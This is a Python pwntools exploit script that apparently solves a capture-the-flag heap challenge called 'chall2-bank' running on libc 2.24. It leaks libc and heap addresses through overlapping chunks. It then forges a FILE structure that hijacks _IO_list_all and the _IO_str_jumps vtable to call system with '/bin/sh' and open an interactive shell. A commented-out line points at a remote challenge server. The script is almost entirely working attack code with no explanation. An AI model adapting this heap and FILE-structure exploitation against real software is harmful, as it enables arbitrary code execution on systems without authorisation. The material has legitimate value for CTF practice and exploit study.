from pwn import *

r = process(["./chall2-bank"],env={"LD_PRELOAD":"./libc-2.24.so"})
#r = remote("185.168.131.144", 6000)
def create(title,size,state):
	r.sendlineafter("5.","1")
	r.sendafter(":",title)
	r.sendlineafter(":",str(size))
	r.sendline(state)

def edit_title(idx,title):
	r.sendlineafter("5.","2")
	r.sendlineafter(":",str(idx))
	r.send(title)

def edit_state(idx,state):
	r.sendlineafter("5.","3")
	r.sendlineafter(":",str(idx))
	r.sendline(state)


def remove(idx):
	r.sendlineafter("5.","4")
	r.sendlineafter(":",str(idx))

def show(idx):
	r.sendlineafter("5.","5")
	r.sendlineafter(":",str(idx))


create("a",0x18,"a")
remove(0)
create("a",0x60,"a")
create("a",0x60,"a")
remove(1)
create("b"*0x10+"\xa1",0x60,"a"*0x28+p64(0x41))
remove(0)
create("a",0x60,"a")
show(1)
r.recvuntil("Statement: ")
libc = u64(r.recvline()[:-1].ljust(8,'\x00'))-0x397b58  #-0x3c4b78
print hex(libc)

#r.interactive()

create("a",0x18,"a") #2
remove(2)
show(1)
r.recvuntil("Statement: ")

heap = u64(r.recvline()[:-1].ljust(8,'\x00'))-0x140
print hex(heap)
create(p64(0x60C0C748),0x18,"a") #2

create("a",0x8,"a") #3
remove(3)
create("a",0x20,"a") #3 
create("a",0x8,"a") #4
create("a",0x30,"a") #5
remove(3)
create("a"*0x10+"\xf1",0x20,"a") #3
remove(4)
create("a",0x40,"a") #4
context.arch = "amd64"
create("a",0x60,flat(heap+0xf8,0x200,libc+0x3c67a8))

create("a",0x18,"a")
remove(7)
create("a",0x60,"a")
create("a",0x60,"a")
remove(8)
create("b"*0x10+"\xa1",0x60,"a"*0x28+p64(0x41))
remove(7)


payload = "\x00"*0x50+p64(0x31).ljust(0x30,'\x00')+p64(0x31)+p64(heap+0xf8).ljust(0x20,'\x00')


system = libc + 0x3f480 #0x45390
io_str_jumps = libc + 0x394500 #0x3c37a0
io_list_all = libc+ 0x398500 #0x3c5520
binsh = libc + 0x1619b9 #0x18cd57
FILE = flat(0,0x61,0x0,io_list_all-0x10,0x0,0x1,0x0,binsh
)

payload += FILE.ljust(0xd8,'\x00')+p64(io_str_jumps-0x8)+p64(system)*2

edit_title(5,payload)

#input(":")

create("a",0x18,"lls")

r.interactive()

